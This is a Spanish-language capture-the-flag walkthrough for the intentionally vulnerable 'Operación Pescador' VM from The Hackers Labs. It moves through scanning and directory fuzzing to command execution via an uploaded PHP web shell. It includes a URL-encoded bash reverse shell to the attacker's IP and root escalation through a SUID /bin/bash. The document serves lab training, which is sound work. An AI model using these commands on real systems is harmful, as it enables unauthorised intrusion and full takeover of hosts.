# 🎣 **Operación Pescador** 🎣
### *Máquina vulnerable de **The Hackers Labs***
**Sistema Operativo:** Linux | **Dificultad:** Media

---

## 📌 **🏷️ Tags**
`Linux` · `Gobuster` · `Wfuzz` · `RCE` · `Web Shell` · `SUID`

---

## 🔧 **📥 Instalación**
1. **Descarga** el archivo `.zip` que contiene la máquina virtual `.ova` de **Operación Pescador**.
2. **Extrae** el archivo y **impórtalo** en **VirtualBox**.
3. **Configura** la interfaz de red para que coincida con tu entorno de ataque (recomendado: **NAT** o **Host-Only**).
4. **Inicia** la máquina víctima (`10.0.4.39`) y tu máquina atacante.

---

## 🔍 **🕵️ Reconocimiento de Hosts**
Antes de atacar, descubre la IP de la máquina víctima con `netdiscover`:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

**Resultado:**
```
IP            MAC Address            Vendor
-----------------------------------------------
10.0.4.39     08:00:27:80:8c:91    PCS Systemtechnik GmbH
```

✅ **IP identificada:** `10.0.4.39`

---

## 🌐 **🚀 Escaneo de Puertos**
Ejecuta un **Nmap** agresivo para enumerar servicios:

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.39
nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.39
```

**Puertos abiertos:**
| Puerto | Servicio       | Versión               |
|--------|----------------|-----------------------|
| 22     | SSH            | OpenSSH 9.2p1 Debian  |
| 80     | HTTP (Apache)  | Apache 2.4.65         |

🔹 **Dominio asociado:** `mail.innovasolutions.thl`
🔹 **Añade al `/etc/hosts`:**
```plaintext
10.0.4.39   mail.innovasolutions.thl
```

---

## 🔎 **🕵️‍♂️ Gobuster: Fuzzing de Directorios**
Busca rutas ocultas con **Gobuster**:

```bash
gobuster dir -u http://mail.innovasolutions.thl \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2.3-medium.txt \
  -x html,php,txt,bak,sh -b 403,404 -t 60
```

**Hallazgos clave:**
- `/login.php` → Panel de login.
- `/uploads/` → Directorio con archivos sospechosos.
- `/upload.php` → Formulario de subida.

🔹 **Archivo interesante:** `foto.png.php` (¡no es una imagen!).

---

## 💻 **🚨 Explotación: RCE (Remote Code Execution)**
1. **Fuzzea parámetros** con **Wfuzz** para encontrar vulnerabilidades:
   ```bash
   wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/... \
     -u "http://mail.innovasolutions.thl/uploads/foto.png.php?FUZZ=id" \
     --hc 404 --hl 2
   ```
   ✅ **Parámetro vulnerable:** `cmd`

2. **Ejecuta comandos remotos**:
   ```bash
   http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=id
   ```

3. **Obtén una **Reverse Shell**:
   - **Escucha en tu máquina:**
     ```bash
     sudo nc -nlvp 4444
     ```
   - **Ejecuta en el navegador** (con URL encoding):
     ```plaintext
     http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%30%2e%34%2e%31%32%2f%34%34%34%34%20%30%3e%26%31%27
     ```
   ✅ **Shell obtenida como `www-data`!**

---

## 🛠️ **🖥️ Tratamiento de TTY**
Mejora la interactividad de la shell:
```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

---

## 🔐 **🔓 Escalada de Privilegios (SUID)**
1. **Busca binarios con SUID**:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
   ✅ **Hallazgo:** `/bin/bash` tiene permisos SUID.

2. **Escalada a `root`**:
   ```bash
   /bin/bash -p
   ```
   ✅ **¡Acceso total como `root`!**

---

## 🏆 **🎯 Flags Obtenidas**
| Usuario       | Flag                          |
|---------------|-------------------------------|
| `laptop`      | `THL{FGF34DU-----ER!RDDLLK}`  |
| `root`        | `THL{QOK44------LEDFFGBGH}`   |

---

## 📌 **📝 Resumen de Ataques**
| Fase          | Herramienta       | Resultado                     |
|---------------|-------------------|-------------------------------|
| Reconocimiento| `netdiscover`     | IP de víctima: `10.0.4.39`   |
| Escaneo       | `nmap`            | Puertos 22 (SSH) y 80 (HTTP)  |
| Fuzzing       | `gobuster`        | `/uploads/foto.png.php`       |
| Explotación   | `wfuzz` + `nc`    | RCE + Reverse Shell (`www-data`) |
| Escalada      | `find` + `/bin/bash -p` | Acceso `root` |

---

## 📢 **💡 Conseos interactivos.
- **Revisa permisos SUID**
